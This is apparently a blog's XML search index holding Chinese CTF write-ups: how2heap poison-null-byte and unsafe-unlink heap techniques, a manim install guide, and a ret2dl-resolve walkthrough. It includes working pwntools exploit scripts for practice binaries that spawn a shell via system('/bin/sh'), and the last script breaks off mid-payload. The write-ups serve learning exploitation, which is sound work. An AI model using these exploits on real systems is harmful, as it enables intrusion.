<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[poison-null-byte]]></title>
    <url>%2F2019%2F09%2F20%2Fpoison-null-byte%2F</url>
    <content type="text"><![CDATA[how2heap poison_null_byte 单字节溢出的攻击方式，利用off by null造成overlapping，使得被overlap的chunk可以通过读取/写入overlap它的chunk被读取/写入(which is able to read/overwrite the victim chunk by read/write the chunk who overlaped it): | 我觉得英文更容易理解一点 源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;int main()&#123; fprintf(stderr, "Welcome to poison null byte 2.0!\n"); fprintf(stderr, "Tested in Ubuntu 14.04 64bit.\n"); fprintf(stderr, "This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n"); fprintf(stderr, "This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n"); uint8_t* a; uint8_t* b; uint8_t* c; uint8_t* b1; uint8_t* b2; uint8_t* d; void *barrier; fprintf(stderr, "We allocate 0x100 bytes for 'a'.\n"); a = (uint8_t*) malloc(0x100); fprintf(stderr, "a: %p\n", a); int real_a_size = malloc_usable_size(a); fprintf(stderr, "Since we want to overflow 'a', we need to know the 'real' size of 'a' " "(it may be more than 0x100 because of rounding): %#x\n", real_a_size); /* chunk size attribute cannot have a least significant byte with a value of 0x00. * the least significant byte of this will be 0x10, because the size of the chunk includes * the amount requested plus some amount required for the metadata. */ b = (uint8_t*) malloc(0x200); fprintf(stderr, "b: %p\n", b); c = (uint8_t*) malloc(0x100); fprintf(stderr, "c: %p\n", c); barrier = malloc(0x100); fprintf(stderr, "We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n" "The barrier is not strictly necessary, but makes things less confusing\n", barrier); uint64_t* b_size_ptr = (uint64_t*)(b - 8); // added fix for size==prev_size(next_chunk) check in newer versions of glibc // https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30 // this added check requires we are allowed to have null pointers in b (not just a c string) //*(size_t*)(b+0x1f0) = 0x200; fprintf(stderr, "In newer versions of glibc we will need to have our updated size inside b itself to pass " "the check 'chunksize(P) != prev_size (next_chunk(P))'\n"); // we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00) // which is the value of b.size after its first byte has been overwritten with a NULL byte *(size_t*)(b+0x1f0) = 0x200; // this technique works by overwriting the size metadata of a free chunk free(b); fprintf(stderr, "b.size: %#lx\n", *b_size_ptr); fprintf(stderr, "b.size is: (0x200 + 0x10) | prev_in_use\n"); fprintf(stderr, "We overflow 'a' with a single null byte into the metadata of 'b'\n"); a[real_a_size] = 0; // &lt;--- THIS IS THE "EXPLOITED BUG" fprintf(stderr, "b.size: %#lx\n", *b_size_ptr); uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2; fprintf(stderr, "c.prev_size is %#lx\n",*c_prev_size_ptr); // This malloc will result in a call to unlink on the chunk where b was. // The added check (commit id: 17f487b), if not properly handled as we did before, // will detect the heap corruption now. // The check is this: chunksize(P) != prev_size (next_chunk(P)) where // P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow) // next_chunk(P) == b-0x10+0x200 == b+0x1f0 // prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200 fprintf(stderr, "We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n", *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8)))); b1 = malloc(0x100); fprintf(stderr, "b1: %p\n",b1); fprintf(stderr, "Now we malloc 'b1'. It will be placed where 'b' was. " "At this point c.prev_size should have been updated, but it was not: %#lx\n",*c_prev_size_ptr); fprintf(stderr, "Interestingly, the updated value of c.prev_size has been written 0x10 bytes " "before c.prev_size: %lx\n",*(((uint64_t*)c)-4)); fprintf(stderr, "We malloc 'b2', our 'victim' chunk.\n"); // Typically b2 (the victim) will be a structure with valuable pointers that we want to control b2 = malloc(0x80); fprintf(stderr, "b2: %p\n",b2); memset(b2,'B',0x80); fprintf(stderr, "Current b2 content:\n%s\n",b2); fprintf(stderr, "Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n"); free(b1); free(c); fprintf(stderr, "Finally, we allocate 'd', overlapping 'b2'.\n"); d = malloc(0x300); fprintf(stderr, "d: %p\n",d); fprintf(stderr, "Now 'd' and 'b2' overlap.\n"); memset(d,'D',0x300); fprintf(stderr, "New b2 content:\n%s\n",b2); fprintf(stderr, "Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks" "for the clear explanation of this technique.\n");&#125; malloc_usable_size需要注意一下： 123456789101112131415161718192021222324252627282930313233static size_tmusable (void *mem)&#123; mchunkptr p; if (mem != 0) &#123; p = mem2chunk (mem); if (__builtin_expect (using_malloc_checking == 1, 0)) return malloc_check_get_size (p); if (chunk_is_mmapped (p)) &#123; if (DUMPED_MAIN_ARENA_CHUNK (p)) return chunksize (p) - SIZE_SZ; else return chunksize (p) - 2 * SIZE_SZ; &#125; else if (inuse (p)) return chunksize (p) - SIZE_SZ; &#125; return 0;&#125;#define chunksize(p) (((p)-&gt;mchunk_size) &amp; ~((0x1 | 0x2 | 0x4)))#define SIZE_SZ (sizeof (INTERNAL_SIZE_T))size_t__malloc_usable_size (void *m)&#123; size_t result; result = musable (m); return result;&#125;#以上为malloc_usable_size的计算方法，所申请的chunk实际可用内存空间为chunk_size - SIZE_SZ x64下malloc申请的实际大小根据申请的大小进行16字节对齐： 若申请0x100，实际大小(包含metadata)为0x100+0x10=0x110若申请0xf8，实际大小(包含metadata)为0xf0+0x10=0x100根据malloc_usable_size，实际可用大小分别为： 0x110-0x8=0x108 0x100-0x8=0xf8 通俗点说，申请的大小低四位不大于8则舍去，大于8则补满16，例如：申请0x43则返回的大小为0x40+0x10=0x50，申请0x49则返回的大小为0x50+0x10=0x60(此处所指大小为metadata中size处的大小) poison_null_byte流程： 首先申请a(0x100),b(0x200),c(0x100),barrier(0x100)四个chunk 设置*(b+0x1f0)=0x200 用于绕过chunksize(P) != prev_size (next_chunk(P)) free(b) off_by_null:b块的size由0x210覆盖为0x200 b1 = malloc(0x100) b2 = malloc(0x80) free(b1) free(c) d = malloc(0x300) overlaped 解释：整个过程的最终目的是要free c后使得c与b合并，将位于b中的b1 overlap，然而要让c一直认为b的大小没有变过就要使得c的prev_size保持不变，所以通过off by null溢出a覆盖b的size最低字节，使得b的大小减少，这样在申请b1和b2时就不会更改c的prev_size了。但是在b(freed)进行分割b1和b2时，会调用unlink标注1，所以会触发检查chunksize(P) != prev_size (next_chunk(P))。由于之前shrink了b的大小，所以需要在相应位置(b+0x1f0)填上fake c prev_size，这时b会认为b+0x1f0处才是真正的c prev_size(如果没有设置fake c prev_size，那对应的位置就是p64(0)，导致检查不通过标注2)。然后在申请b1和b2后对fake c prev_size减去b1和b2的大小，最终保证了真正的c prev_size没有被影响。 标注1：当调用malloc时，会搜索bin中合适的chunk来返回给用户，在目前这种情况下，bin中只有一个unsorted bin，所以如果用户申请chunk的大小小于它，malloc会尝试从unsorted bin中split出一块chunk，split完成后会调用unlink_chunk将分裂出的块unlink出来，返回给用户 https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#4053 (malloc中调用unlink) https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#unlink_chunk (unlink) 标注2：https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#1464 (尝试不设置fake c prev_size，最终会在这里报错(“corrupted size vs. prev_size”))]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>how2heap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[manim在WSL下安装]]></title>
    <url>%2F2019%2F09%2F10%2Fmanim%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[发现3b1b自制的动画引擎manim挺有意思的，弄一个玩玩。 在WSL下安装，版本：ubuntu 18.04 要使用manim，需要安装以下内容： manim latex ffmpeg sox cairo 官网是这样写的，我没有按这样的顺序安装 python3 -m manim example_scenes.py SquareToCircle -pl可以测试是否安装完成，如果命令执行成功会在相应文件夹下生成SquareToCircle.mp4文件，这就是刚生成的动画demo。 由于我有python和pip，所以有些步骤可能省略没写 1234567891011121314151617$ git clone https://github.com/3b1b/manim.git$ python3 -m pip install -r requirements.txt$ sudo apt install python3-cairo$ sudo apt install ffmpeg$ python3 -m pip install colour$ sudo python3 -m pip install numpy$ sudo python3 -m pip install tqdm$ sudo python3 -m pip install scipy$ sudo python3 -m pip install Pillow$ sudo python3 -m pip install pydub$ sudo apt-get update$ sudo apt-get install -y libsm6 libxext6 libxrender-dev$ sudo pip install opencv-python$ sudo apt install texlive-latex-base$ sudo apt install texlive-latex-extra$ sudo apt install texlive-fonts-extra$ sudo apt-get install texlive-full 期间坑也遇到不少，反正一直执行python3 -m manim example_scenes.py SquareToCircle -pl，提示缺什么包就安什么包，中间比较坑的是提示没有pil包，这里需要安装pillow。提示没有cv2则需要安装opencv-python，我安装这个包时一直报错，最后改了一下pip源，就成功了。 执行生成命令时需要位于manim目录下。 4个demo都可以生成动画就说明完全安装了，记得使用python3，python2会报错。还有什么问题基本上可以在issues区里找到答案。 1234$ sudo python3 -m manim example_scenes.py WarpSquare -pl$ sudo python3 -m manim example_scenes.py SquareToCircle -pl$ sudo python3 -m manim example_scenes.py WriteStuff -pl$ sudo python3 -m manim example_scenes.py UpdatersExample -pl]]></content>
  </entry>
  <entry>
    <title><![CDATA[unsafe-unlink]]></title>
    <url>%2F2019%2F09%2F09%2Funsafe-unlink%2F</url>
    <content type="text"><![CDATA[遇到一道利用unlink的基础题目，跟着how2heap复习一下。 Unsafe unlink: Constructing fake fhunk and using free to get arbitary write 分析unlink的利用其实之前也大概分析过[传送门]，但当时分析的unlink非常古老，安全保护不足，所以非常low :|，下面直接来分析。 unsafe unlink 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;uint64_t *chunk0_ptr;int main()&#123; fprintf(stderr, "Welcome to unsafe unlink 2.0!\n"); fprintf(stderr, "Tested in Ubuntu 14.04/16.04 64bit.\n"); fprintf(stderr, "This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n"); fprintf(stderr, "This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n"); fprintf(stderr, "The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n"); int malloc_size = 0x80; //we want to be big enough not to use fastbins int header_size = 2; fprintf(stderr, "The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n"); chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0 uint64_t *chunk1_ptr = (uint64_t*) malloc(malloc_size); //chunk1 fprintf(stderr, "The global chunk0_ptr is at %p, pointing to %p\n", &amp;chunk0_ptr, chunk0_ptr); fprintf(stderr, "The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr); fprintf(stderr, "We create a fake chunk inside chunk0.\n"); fprintf(stderr, "We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n"); chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3); fprintf(stderr, "We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n"); fprintf(stderr, "With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n"); chunk0_ptr[3] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2); fprintf(stderr, "Fake chunk fd: %p\n",(void*) chunk0_ptr[2]); fprintf(stderr, "Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]); fprintf(stderr, "We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n"); uint64_t *chunk1_hdr = chunk1_ptr - header_size; fprintf(stderr, "We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n"); fprintf(stderr, "It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n"); chunk1_hdr[0] = malloc_size; fprintf(stderr, "If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n",(void*)chunk1_hdr[0]); fprintf(stderr, "We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n"); chunk1_hdr[1] &amp;= ~1; fprintf(stderr, "Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n"); fprintf(stderr, "You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n"); free(chunk1_ptr); fprintf(stderr, "At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n"); char victim_string[8]; strcpy(victim_string,"Hello!~"); chunk0_ptr[3] = (uint64_t) victim_string; fprintf(stderr, "chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n"); fprintf(stderr, "Original value: %s\n",victim_string); chunk0_ptr[0] = 0x4141414142424242LL; fprintf(stderr, "New Value: %s\n",victim_string);&#125; 程序一开始声明了一个全局指针chunk0_ptr，并使其指向0x80大小的chunk，然后chunk1_ptr也指向了一块0x80的chunk： 12chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0uint64_t *chunk1_ptr = (uint64_t*) malloc(malloc_size); //chunk1 程序假设chunk0_ptr所指向的chunk有溢出漏洞，于是在chunk0_ptr所指向的chunk中构造fake chunk： 12chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3);chunk0_ptr[3] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2); chunk0_ptr[2]，chunk0_ptr[3]分别是fake chunk的fd和bk，指向&amp;chunk0_ptr-0x18和&amp;chunk0_ptr-0x10处。这样做可以使chunk0-&gt;fd-&gt;bk == chunk0 &amp;&amp; chunk0-&gt;bk-&gt;fd == chunk0从而绕过(P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False这个保护。注意chunk0_ptr[0]和chunk0_ptr[1]处也要构造fake chunk的头部。 接着是溢出到chunk1头部： 12chunk1_hdr[0] = malloc_size;chunk1_hdr[1] &amp;= ~1; 这里将chunk1的头部元信息previous size覆盖为0x80，并将size的最低位置0。所以在free chunk1时，堆内存管理程序会认为我们构造的fake chunk是从chunk0_ptr[2]开始的free chunk，为了合并这两个chunk从而执行unlink操作，完成利用。 此时的chunk分布如下： 此时调用free，触发unlink，导致chunk0_ptr被覆盖： 1free(chunk1_ptr); unlink主要实现的功能： 123456#define unlink(P, BK, FD) &#123; FD = P-&gt;fd; BK = P-&gt;bk; FD-&gt;bk = BK; BK-&gt;fd = FD; &#125; unlink完成后，chunk0_ptr会指向chunk0_ptr-0x18，所以chunk0_ptr[0]是chunk0_ptr-0x18处的内容，自然，chunk0_ptr[3]所在的地址就和chunk0_ptr一样了。如果更改chunk0_ptr[3]的值为某地址victim，这时的chunk0_ptr就指向了victim(即chunk0_ptr[0]就是victim的内容)，修改chunk0_ptr[0]就可以修改原来victim处的内容，修改victim为想要的地址，就可以达到任意地址写的目的。 题目题目 一道简单的unlink练习 程序提供三个功能：new，edit和delete，修改一个全局变量为相应的值即可调用程序提供的后门函数。利用edit函数缺少的边界检查来造成堆溢出，触发unlink漏洞。 123456789101112131415161718192021222324252627282930313233343536373839from pwn import * context.log_level = "debug" chunk_list = 0x4040c0def new(size, cont): r.sendlineafter('choice :', '1') r.sendlineafter('Size of note :', str(size)) r.sendlineafter('note:', cont)def edit(idx, size, cont): r.sendlineafter('choice :', '2') r.sendlineafter('Index :', str(idx)) r.sendlineafter('Size of note :', str(size)) r.sendlineafter('Content of note :',cont)def dele(idx): r.sendlineafter('choice :', '3') r.sendlineafter('Index :', str(idx))r = process('./pwn14')new(0x80,'a'*0x10)new(0x80,'b'*0x10)payload = p64(0) + p64(0x80) + p64(chunk_list - 0x18) + p64(chunk_list - 0x10)payload += 'a'*(0x80 - len(payload))payload += p64(0x80) + p64(0x90)edit(0, 0x100, payload)dele(1)payload = 'a'*0x18 + p64(0x4040a0)edit(0, 0x30, payload)edit(0, 0x10, '9999')r.sendlineafter('choice', '70')r.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>how2heap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ret2dl-resolve]]></title>
    <url>%2F2019%2F09%2F03%2Fret2dl-resolve%2F</url>
    <content type="text"><![CDATA[之前觉得这玩意绕来绕去太麻烦就放在那儿，最后终究要捡起来，然后说一句真香。 记录一下学习ret2dl-resolve的曲折历程。可能顺带回顾一下之前的内容。这篇文章会尽量讲清楚利用过程。 前置知识首先需要了解构成elf文件的section header table，在后面的分析中主要涉及到三个section：.dynsym，.rela.plt和.dynstr .rela.plt节(JMPREL段)的结构体组成如下: 123456typedef struct&#123; Elf64_Addr r_offset; /* Address */ Elf64_Xword r_info; /* Relocation type and symbol index */ Elf64_Sxword r_addend; /* Addend */&#125; Elf64_Rela; r_offset: 该函数在.got.plt中的地址r_info: 包含该函数在.dynsym节中的索引和重定位类型r_addend: 指定用于计算要存储到可重定位字段中的值的常量加数 .dynsym节(SYMTAB段)的结构体组成： 123456789typedef struct&#123; Elf64_Word st_name; /* Symbol name (string tbl index) */ unsigned char st_info; /* Symbol type and binding */ unsigned char st_other; /* Symbol visibility */ Elf64_Section st_shndx; /* Section index */ Elf64_Addr st_value; /* Symbol value */ Elf64_Xword st_size; /* Symbol size */&#125; Elf64_Sym; st_name: 该值为此函数在.dynstr中的偏移，其中包含符号名称的字符表示形式。 .rel.plt内结构体组成：12345typedef struct&#123; Elf32_Addr r_offset; /* Address */ Elf32_Word r_info; /* Relocation type and symbol index */&#125; Elf32_Rel; r_offset: 该函数在.got.plt中的地址r_info: 包含该函数在.dynsym节中的索引和重定位类型 .dynsym内结构体组成：123456789typedef struct&#123; Elf32_Word st_name; /* Symbol name (string tbl index) */ Elf32_Addr st_value; /* Symbol value */ Elf32_Word st_size; /* Symbol size */ unsigned char st_info; /* Symbol type and binding */ unsigned char st_other; /* Symbol visibility */ Elf32_Section st_shndx; /* Section index */&#125; Elf32_Sym; st_name: 该值为此函数在.dynstr中的偏移，其中包含符号名称的字符表示形式。 以前做protostar的时候简单学习过一次plt和got，但当时仅限于plt和got表间的跳转[传送门]，最后的分析止步于dl_runtime_resolve。这次的ret2dl-resolve就会涉及到dl_runtime_resolve这个函数内的具体实现，并加以利用。 要利用这个函数首先就要理清他的内部逻辑，以及涉及到的各种结构体。在学习了多个大佬的博客之后，终于慢慢理解了got表中函数的地址是怎么样一步一步从无到有的(我太菜了)。为了便于自己理解，我把整个过程称作三次跳跃(三级跳是不是好听点:p)。 跟踪观察puts函数从被调用，到完成其重定向的整个过程。(用例为64位elf) 这是调用dl_runtime_resolve前的流程，用一张图可以很直观的展示出来。可以看到，在0x4005c0和0x4005d6处push的分别是它的两个参数link_map和reloc_offset。 此时程序流程进入到dl_runtime_resolve中，开始重定向操作。而真正的重定向由dl_runtime_resolve中的_dl_fixup完成。 _dl_fixup的源码在这里： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677DL_FIXUP_VALUE_TYPEattribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE_dl_fixup (# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS ELF_MACHINE_RUNTIME_FIXUP_ARGS,# endif struct link_map *l, ElfW(Word) reloc_arg)&#123; const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]); const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]); const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset); const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)]; const ElfW(Sym) *refsym = sym; void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset); lookup_t result; DL_FIXUP_VALUE_TYPE value; /* Sanity check that we're really looking at a PLT relocation. */ assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT); /* Look up the target symbol. If the normal lookup rules are not used don't look in the global scope. */ if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0) &#123; const struct r_found_version *version = NULL; if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL) &#123; const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]); ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff; version = &amp;l-&gt;l_versions[ndx]; if (version-&gt;hash == 0) version = NULL; &#125; /* We need to keep the scope around so do some locking. This is not necessary for objects which cannot be unloaded or when we are not using any threads (yet). */ int flags = DL_LOOKUP_ADD_DEPENDENCY; if (!RTLD_SINGLE_THREAD_P) &#123; THREAD_GSCOPE_SET_FLAG (); flags |= DL_LOOKUP_GSCOPE_LOCK; &#125;#ifdef RTLD_ENABLE_FOREIGN_CALL RTLD_ENABLE_FOREIGN_CALL;#endif result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL); /* We are done with the global scope. */ if (!RTLD_SINGLE_THREAD_P) THREAD_GSCOPE_RESET_FLAG ();#ifdef RTLD_FINALIZE_FOREIGN_CALL RTLD_FINALIZE_FOREIGN_CALL;#endif /* Currently result contains the base load address (or link map) of the object that defines sym. Now add in the symbol offset. */ value = DL_FIXUP_MAKE_VALUE (result, SYMBOL_ADDRESS (result, sym, false)); &#125; else &#123; /* We already found the symbol. The module (and therefore its load address) is also known. */ value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true)); result = l; &#125; /* And now perhaps the relocation addend. */ value = elf_machine_plt_value (l, reloc, value); if (sym != NULL &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0)) value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value)); /* Finally, fix up the plt itself. */ if (__glibc_unlikely (GLRO(dl_bind_not))) return value; return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);&#125; _dl_fixup的参数由dl_runtime_resolve压栈传递，即link_map和reloc_offset(由前面宏定义可知reloc_offset和reloc_arg是一样的) 123const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]);const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset); line9到line13(后面简写为l)从link_map中获取.dynsym，.rela.plt，.dynstr等节的地址。 reloc_offset的值用于指示包含该函数某些信息的结构体在.rela.plt节中的位置 .rela.plt段中能看到puts对应的结构体，其info的值为0x100000007,从中提取到的.dynsym索引为1，重定位类型为7(即R_386_JMP_SLOT) 1234R_386_JMP_SLOT Created by the link-editor for dynamic objects to provide lazy binding. Its offset member gives the location of a procedure linkage table entry. The runtime linker modifies the procedure linkage table entry to transfer control to the designated symbol address. 至此，通过reloc_offset进行的第一次跳跃完成，现在需要使用r_info进行第二次跳跃。已经从link_map获取了.dynsym的起始地址，所以puts在.dynsym中的位置是.dynsym[1]。 从puts在.dynsym中的Elf64_Sym结构体成员st_name找到了其名称的字符串在.dynstr中的偏移为0x10，至此完成了第二次跳跃。同前面一样，由.dynstr的起始地址加上偏移就能在.dynstr中找到该函数对应符号的字符串。现在进行第三次跳跃。 由起始地址(0x4003e8)加上偏移(0x10)得到的字符串则是预期中的puts(0x4003f8),最后一跳完成。 三次跳跃示意图 这个字符串作为l47的_dl_lookup_symbol_x函数的参数之一，返回值为libc基址，保存在result中。l58的DL_FIXUP_MAKE_VALUE宏从已装载的共享库中查找puts函数的地址，对其重定位后加上该程序的装载地址，得到puts函数的真实地址，结果保存在value中。最后调用elf_machine_fixup_plt，向puts函数对应got表中填写真实地址，其中参数rel_addr为之前算出的该函数got表地址(0x620018)。 到此为止puts函数已经完成重定向，利用的方式也很显然：即首先构造fake reloc_arg使得.rela.plt起始地址加上这个值后的地址落在我们可控的区域内，接着依次构造fake .dynsym和.dynstr，形成一个完整的fake链，最后在.dynstr相应位置填写system就可以从动态库中将system的真实地址解析到puts的got表项中，最终调用puts实际调用的则是system。 但是想要成功利用的话还有一个地方需要注意，在源码的l26到l33： 123456789if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)&#123; const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]); ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff; version = &amp;l-&gt;l_versions[ndx]; if (version-&gt;hash == 0) version = NULL;&#125; 这段代码取r_info的高位作为vernum的下标，访问对应的值并赋给ndx，再从l_versions中找到对应的值赋给version。 问题在于，我们构造的fake链一般位于bss段(64位下，bss段一般位于0x600000之后)，.rela.plt一般在0x400000左右,所以我们构造的r_info的高位:reloc_arg一般会很大，又因为程序计算&amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)]和vernum[ELFW(R_SYM) (reloc-&gt;r_info)]时使用下标的数据类型大小不同(symtab中的结构体大小为0x18字节，vernum的数据类型为uint16_t，大小为0x2字节)，这就导致vernum[ELFW(R_SYM) (reloc-&gt;r_info)]大概率会访问到0x400000到0x600000之间的不可读区域(64位下，这个区间一般不可读)，使得程序报错。 如果使得l-&gt;l_info[VERSYMIDX (DT_VERSYM)]的值为0，就可以绕过这块if判断，而l-&gt;l_info[VERSYMIDX (DT_VERSYM)]的位置就在link_map+0x1c8处，所以需要泄露位于0x620008处link_map的值，并将link_map+0x1c8置零。 这种攻击方式依赖源程序自带的输出函数。 x64题目提取码：eo5z 之前第五空间比赛的一道题目，本身很简单，坑的是泄露libc之后无论如何都找不到对应的libc版本。这时就需要ret2dl-resolve(把所有libc dump下来挨个找也行。。) 刚才分析的用例就是这道题中的puts函数，已经分析的差不多了，剩下的就是精确计算偏移。 首先泄露link_map地址： 12345678payload = p8(0)*(0x10)payload += p64(0)payload += p64(pop_rdi)payload += p64(link_map_ptr)payload += p64(puts_plt)payload += p64(start)r.sendline(payload)link_map_addr = u64(r.recv(6).ljust(8, "\x00")) loop回start函数继续利用溢出覆盖link_map+0x1c8、构造fake链： 1234567base_addr = 0x620789 align = 0x18 - (base_addr - rel_plt_addr) % 0x18 #Elf64_Rela大小为0x18字节，所以按0x18对齐base_addr = base_addr + align #对齐后为0x620798reloc_arg = (base_addr - rel_plt_addr) / 0x18 #获得fake .rela.plt偏移dynsym_off = (base_addr + 0x18 - dynsym_addr) / 0x18 #获得fake .dynsym偏移system_off = base_addr + 0x30 - dynstr_addr bin_sh_addr = base_addr + 0x38 base_addr为puts在fake .rela.plt的地址，这个位置选在了.data段，因为此段有很大一部分都是可写并且不会影响其他功能，所以在这一段中随便选了一个地址。由于后面有对齐操作，所以这里的base_addr故意没有对齐。 base_addr处，构造后的fake链： 红色fake .rela.plt 蓝色fake .dynsym 绿色system和/bin/sh 最终payload： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105from pwn import *#-*- coding:utf-8 -*-context.log_level = 'debug'r = process('./pwn')#gdb.attach(r)elf = ELF('./pwn')puts_plt = 0x4005d0read_plt = 0x400600exit_plt = 0x400630 puts_got = 0x620018read_got = 0x620030exit_got = 0x620048pop_rdi = 0x414fc3pop_rsi_r15 = 0x414fc1read_func = 0x4007e2plt_addr = 0x4005c0data_addr = 0x620060got_plt_addr = 0x620000pop_rbp_ret = 0x4006b0leave_ret = 0x4039a3dynsym_addr = 0x4002c8dynstr_addr = 0x4003e8rel_plt_addr = 0x4004f0link_map_ptr = got_plt_addr+0x8start = 0x400650main = 0x4007c3r.sendline('-1')r.recvuntil('GOOD?\n')base_addr = 0x620789align = 0x18 - (base_addr - rel_plt_addr) % 0x18 base_addr = base_addr + align #0x620798reloc_arg = (base_addr - rel_plt_addr) / 0x18 dynsym_off = (base_addr + 0x18 - dynsym_addr) / 0x18 system_off = base_addr + 0x30 - dynstr_addrbin_sh_addr = base_addr + 0x38 log.info("base_addr: "+hex(base_addr))log.info("reloc_arg: "+hex(reloc_arg))log.info("dynsym_off: "+hex(dynsym_off))log.info("system_off: "+hex(system_off))log.info("bin_sh_addr: "+hex(bin_sh_addr))payload = p8(0)*(0x10)payload += p64(0)payload += p64(pop_rdi)payload += p64(link_map_ptr)payload += p64(puts_plt)payload += p64(start)r.sendline(payload)link_map_addr = u64(r.recv(6).ljust(8, "\x00"))log.success('link_map_addr: ' + hex(link_map_addr))r.sendline('-1')r.recvuntil('GOOD?\n')payload2 = p8(0)*0x18payload2 += p64(pop_rsi_r15)payload2 += p64(0x20)payload2 += p64(0)payload2 += p64(pop_rdi)payload2 += p64(link_map_addr + 0x1c0)payload2 += p64(read_func)payload2 += p64(pop_rsi_r15)payload2 += p64(0x100)payload2 += p64(0)payload2 += p64(pop_rdi)payload2 += p64(base_addr - 0x8) payload2 += p64(read_func)#读取fake链到可控制区域(.data)payload2 += p64(pop_rdi)payload2 += 